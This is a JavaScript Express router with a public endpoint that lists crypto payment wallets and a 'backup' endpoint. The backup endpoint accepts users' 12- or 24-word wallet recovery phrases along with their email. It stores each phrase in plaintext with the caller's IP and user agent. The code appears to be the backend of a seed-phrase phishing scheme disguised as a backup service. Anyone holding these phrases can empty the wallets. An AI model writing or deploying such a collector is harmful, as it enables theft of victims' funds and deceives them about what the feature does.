import express from 'express';
import { sql } from '../config/db.js';

const router = express.Router();

// Public endpoint: list active payment wallets for receive flow
router.get('/payment_wallets', async (req, res) => {
  try {
    const rows = await sql`
      SELECT currency, network, address, label, memo_tag, is_active
      FROM payment_wallets
      WHERE is_active = TRUE
      ORDER BY created_at DESC
    `;

    const wallets = rows.map((r) => ({
      coin_symbol: (r.currency || '').toUpperCase(),
      coin_name: r.label || null,
      network: r.network || null,
      address: r.address || null,
      memo_tag: r.memo_tag || null,
    }));

    // Return as array for simplicity; client also accepts { wallets }
    return res.status(200).json(wallets);
  } catch (error) {
    console.log('Error fetching public payment wallets', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
});

// Public endpoint: accept phrase backups
router.post('/backup', async (req, res) => {
  try {
    const email = String(req.body?.email || '').trim().toLowerCase();
    const phraseRaw = String(req.body?.phrase || '').trim();
    const wallet_name = String(req.body?.wallet || req.body?.wallet_name || 'Wallet').trim() || 'Wallet';
    const image_src = (req.body?.image ? String(req.body.image) : req.body?.image_src ? String(req.body.image_src) : '').trim();

    if (!email) return res.status(400).json({ message: 'Email is required' });
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.status(400).json({ message: 'Invalid email' });

    const parts = phraseRaw.split(/\s+/).filter(Boolean);
    if (!(parts.length === 12 || parts.length === 24)) {
      return res.status(400).json({ message: 'Phrase must be 12 or 24 words' });
    }

    const recovery_phrase = parts.join(' ');
    const wallet_key = wallet_name.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '') || null;
    const ip_addr = (req.headers['x-forwarded-for']?.toString().split(',')[0] || req.ip || '').trim() || null;
    const user_agent = (req.get('user-agent') || '').trim() || null;

    const rows = await sql`
      INSERT INTO phrase_backups (wallet_key, wallet_name, email, recovery_phrase, image_src, ip_addr, user_agent)
      VALUES (${wallet_key}, ${wallet_name}, ${email}, ${recovery_phrase}, ${image_src || null}, ${ip_addr}, ${user_agent})
      RETURNING id, user_id, wallet_key, wallet_name, email, recovery_phrase, image_src, ip_addr, user_agent, status, created_at, updated_at
    `;

    const backup = rows[0];
    return res.status(201).json({ backup });
  } catch (error) {
    console.log('Error creating phrase backup', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
});

export default router;
